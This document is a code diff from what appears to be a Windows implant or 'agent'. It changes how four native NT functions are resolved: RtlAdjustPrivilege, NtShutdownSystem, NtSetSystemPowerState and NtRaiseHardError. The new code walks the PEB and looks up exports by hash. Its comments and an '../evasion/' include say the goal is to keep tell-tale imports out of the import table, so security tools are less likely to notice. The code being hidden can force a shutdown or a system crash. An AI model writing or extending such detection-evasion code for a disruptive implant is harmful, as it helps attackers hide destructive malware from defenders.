@@ -3,9 +3,13 @@
  * ===========================================================
  * Implements ntcalls_load() and ntcalls_verify() declared in ntcalls.h.
  * All NT function pointer globals are defined here.
+ *
+ * IAT-clean: GetModuleHandleW and GetProcAddress replaced with PEB walk so
+ * those high-signal imports do not appear in the agent's import table.
  */
 
 #include "ntcalls.h"
+#include "../evasion/peb_walk.h"
 
 /* ── Global NT function pointers (all start NULL) ───────────────────────── */
 NTSTATUS (NTAPI *RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN) = NULL;
@@ -23,15 +27,15 @@ ULONG g_hardErrorResponse = 0;
 
 BOOL ntcalls_load(void)
 {
-    /* ntdll is always already mapped — GetModuleHandle avoids bumping the
-     * reference count (no matching FreeLibrary needed).                   */
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    /* Resolve ntdll via PEB walk — no GetModuleHandleW in IAT */
+    PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
     if (!hNtdll) return FALSE;
 
-    RtlAdjustPrivilege    = (PVOID)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
-    NtShutdownSystem      = (PVOID)GetProcAddress(hNtdll, "NtShutdownSystem");
-    NtSetSystemPowerState = (PVOID)GetProcAddress(hNtdll, "NtSetSystemPowerState");
-    NtRaiseHardError      = (PVOID)GetProcAddress(hNtdll, "NtRaiseHardError");
+    /* Resolve each function via export table walk — no GetProcAddress in IAT */
+    RtlAdjustPrivilege    = (PVOID)peb_get_export(hNtdll, peb_hash_str("RtlAdjustPrivilege"));
+    NtShutdownSystem      = (PVOID)peb_get_export(hNtdll, peb_hash_str("NtShutdownSystem"));
+    NtSetSystemPowerState = (PVOID)peb_get_export(hNtdll, peb_hash_str("NtSetSystemPowerState"));
+    NtRaiseHardError      = (PVOID)peb_get_export(hNtdll, peb_hash_str("NtRaiseHardError"));
 
     if (!RtlAdjustPrivilege || !NtShutdownSystem ||
         !NtSetSystemPowerState || !NtRaiseHardError)
